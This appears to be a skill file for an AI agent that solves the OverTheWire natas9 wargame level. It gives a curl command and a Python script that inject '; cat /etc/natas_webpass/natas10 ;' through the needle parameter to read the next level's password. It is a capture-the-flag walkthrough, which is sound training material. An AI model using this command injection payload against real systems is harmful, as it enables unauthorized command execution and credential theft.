---
name: natas-9
description: >-
  Use when solving OverTheWire natas9: given natas9 credentials, inject a shell
  command through the needle parameter (passthru/grep) to cat
  /etc/natas_webpass/natas10 and extract the natas10 password.
---
# natas9

**Input:** username and password for natas9.

**Weakness:** the page passes the `needle` form value straight into `passthru("grep -i $key dictionary.txt")` with no sanitization. Terminate the grep with `;` and run your own command (command injection).

**Network:** run on a host that can reach `natas9.natas.labs.overthewire.org`. On Windows PowerShell use `python` / `curl.exe`, not the `curl` alias.

## Steps

1. One-shot with curl.exe (GET; the payload breaks out of grep and cats the next password file):

```bash
curl.exe -s -u USER:PASS http://natas9.natas.labs.overthewire.org/ \
  --get --data-urlencode "needle=; cat /etc/natas_webpass/natas10 ;" --data-urlencode "submit=Search"
```

The natas10 password appears inside the `<pre>` Output block.

2. Derive it programmatically (never hardcode it). Save this as `solve.py` and run `python solve.py USER PASS`:

```python
#!/usr/bin/env python3
import base64, re, sys, urllib.parse, urllib.request
user, password = sys.argv[1], sys.argv[2]
auth = "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()
base = "http://natas9.natas.labs.overthewire.org"
qs = urllib.parse.urlencode({"needle": "; cat /etc/natas_webpass/natas10 ;", "submit": "Search"})
req = urllib.request.Request(f"{base}/?{qs}", headers={"Authorization": auth})
html = urllib.request.urlopen(req, timeout=30).read().decode()
print(re.search(r"<pre>\s*([A-Za-z0-9]{32})\s*</pre>", html).group(1))
```

3. The printed string is the natas10 password.

4. Confirm by GETting `http://natas10.natas.labs.overthewire.org/` with Basic Auth `natas10:<password>` and expecting HTTP 200.
